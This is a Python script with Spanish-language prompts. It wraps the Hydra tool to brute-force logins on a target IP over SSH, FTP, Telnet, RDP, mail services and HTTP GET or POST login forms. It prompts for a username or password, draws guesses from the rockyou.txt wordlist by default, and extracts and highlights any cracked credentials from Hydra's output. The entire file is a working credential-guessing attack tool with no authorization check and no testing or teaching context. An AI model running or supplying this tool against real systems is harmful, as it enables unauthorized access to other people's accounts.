#!/usr/bin/env python3
import subprocess as sp
import ipaddress as add
from pathlib import Path
import re

# Paleta ANSI
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"

print(f"""{CYAN}
    ─────────────────────────────────
    ╦ ╦╦ ╦╔╦╗╦═╗╔═╗  ╔═╗╔═╗╦═╗╔═╗╔═╗
    ╠═╣╚╦╝ ║║╠╦╝╠═╣  ╠╣ ║ ║╠╦╝║  ║╣ 
    ╩ ╩ ╩ ═╩╝╩╚═╩ ╩  ╚  ╚═╝╩╚═╚═╝╚═╝
    ───────────────────────────────── 
{RESET}""")

print(f"{YELLOW}Digite la IP del objetivo{RESET}")
ip = input(">>> ").strip()

def victima(ip):
    try:
        add.ip_address(ip)
        return True
    except:
        return False

if not victima(ip):
    print(f"{RED}IP no válida!{RESET}")
    exit()

print("")
print(f"{YELLOW}Digite el numero para escoger una opcion{RESET}")
print(" [1] tengo el usuario + wordlist")
print(" [2] wordlist + tengo la contraseña")
opcion = input(">>> ").strip()

if opcion == "1":
    usuario = input(f"{YELLOW}Digite el usuario{RESET}\n>>> ").strip()
elif opcion == "2":
    contraseña = input(f"{YELLOW}Digite la contraseña{RESET}\n>>> ").strip()
else:
    print(f"{RED}Opción no válida!{RESET}")
    exit()

def obtener_diccionario(dic_usuario: str):
    destino = Path.cwd() / "rockyou.txt"
    sys_txt = Path("/usr/share/wordlists/rockyou.txt")
    sys_gz = Path("/usr/share/wordlists/rockyou.txt.gz")

    if dic_usuario.strip():
        ruta = Path(dic_usuario).expanduser()
        if ruta.exists():
            return ruta
        raise FileNotFoundError(f"No existe: {ruta}")

    if destino.exists():
        return destino

    if sys_txt.exists():
        sp.run(["cp", str(sys_txt), str(destino)], check=True)
        return destino

    if sys_gz.exists():
        sp.run(["gunzip", "-k", str(sys_gz)], check=True)
        sp.run(["cp", str(sys_txt), str(destino)], check=True)
        return destino

    raise FileNotFoundError("No se encontró rockyou.txt ni rockyou.txt.gz en el sistema.")

print("")
diccionario = input(
    f"{YELLOW}Escribe aqui la ruta del diccionario que quieras usar "
    f"[Enter para omitir (se utilizara el diccionario por default)]{RESET}\n>>> "
)

try:
    diccionario_final = obtener_diccionario(diccionario)
    print(f"{GREEN}Usando diccionario:{RESET} {diccionario_final}")
except Exception as e:
    print(f"{RED}Error:{RESET}", e)
    exit()

print("")
servicio = input(
    f"{YELLOW}Digite el servicio a atacar (ej: ssh, ftp, telnet, rdp, http-get, http-post){RESET}\n>>> "
).strip().lower()

puerto = input(f"{YELLOW}Puerto [Enter para default]:{RESET} ").strip()

def ejecutar(cmd):
    print(f"{CYAN}{' '.join(cmd)}{RESET}")
    proc = sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT, text=True)
    encontrados = []

    for line in proc.stdout:
        print(line, end="")
        match = re.search(r'login:\s*(\S+)\s+password:\s*(\S+)', line)
        if match:
            encontrados.append((match.group(1), match.group(2)))

    proc.wait()

    if encontrados:
        print(f"\n{GREEN}=== Credenciales encontradas ==={RESET}")
        for u, p in encontrados:
            # Marcado brillante de hallazgos
            print(f"{RED}{BOLD}{u}{RESET}: {RED}{BOLD}{p}{RESET}")
    else:
        print(f"\n{YELLOW}No se encontraron credenciales.{RESET}")

def ataque_normal_usuario():
    print(f"{CYAN}Iniciando ataque Hydra...{RESET}")
    cmd = [
        "hydra",
        "-l", usuario,
        "-P", str(diccionario_final),
        f"{servicio}://{ip}"
    ]
    if puerto:
        cmd.extend(["-s", puerto])
    ejecutar(cmd)

def ataque_normal_contra():
    print(f"{CYAN}Iniciando ataque Hydra...{RESET}")
    cmd = [
        "hydra",
        "-p", contraseña,
        "-L", str(diccionario_final),
        f"{servicio}://{ip}"
    ]
    if puerto:
        cmd.extend(["-s", puerto])
    ejecutar(cmd)

def ataque_http_get():
    if opcion != "1":
        print(f"{RED}Para http-get necesitas usuario + wordlist{RESET}")
        exit()
    
    ruta = input(f"{YELLOW}Ruta del recurso (ej: /login) [Enter para /]:{RESET}\n>>> ").strip()
    if not ruta:
        ruta = "/"
    
    print(f"{CYAN}Iniciando ataque HTTP GET...{RESET}")
    cmd = [
        "hydra",
        "-l", usuario,
        "-P", str(diccionario_final),
        f"http-get://{ip}{ruta}"
    ]
    if puerto:
        cmd.extend(["-s", puerto])
    ejecutar(cmd)

def ataque_http_post():
    if opcion != "1":
        print(f"{RED}Para http-post necesitas usuario + wordlist{RESET}")
        exit()
    
    ruta = input(f"{YELLOW}Ruta del formulario (ej: /login.php) [Enter para /login]:{RESET}\n>>> ").strip()
    if not ruta:
        ruta = "/login"
    
    campos = input(f"{YELLOW}Campos del formulario (ej: username=^USER^&password=^PASS^) [Enter para default]:{RESET}\n>>> ").strip()
    if not campos:
        campos = "username=^USER^&password=^PASS^"
    
    mensaje_error = input(f"{YELLOW}Mensaje de error cuando falla el login (ej: incorrecto, failed, invalid) [Enter para omitir]:{RESET}\n>>> ").strip()
    
    print(f"{CYAN}Iniciando ataque HTTP POST...{RESET}")
    
    if mensaje_error:
        cmd = [
            "hydra",
            "-l", usuario,
            "-P", str(diccionario_final),
            f"http-post-form://{ip}{ruta}:{campos}:F={mensaje_error}"
        ]
    else:
        cmd = [
            "hydra",
            "-l", usuario,
            "-P", str(diccionario_final),
            f"http-post-form://{ip}{ruta}:{campos}"
        ]
    
    if puerto:
        cmd.extend(["-s", puerto])
    ejecutar(cmd)

print("")
print(f"{GREEN}>>> Ejecutando ataque...{RESET}")

if servicio in ["ssh", "ftp", "telnet", "smtp", "pop3", "imap", "rdp"]:
    if opcion == "1":
        ataque_normal_usuario()
    elif opcion == "2":
        ataque_normal_contra()

elif servicio == "http-get":
    ataque_http_get()

elif servicio == "http-post":
    ataque_http_post()

else:
    print(f"{RED}Servicio no soportado aun!{RESET}")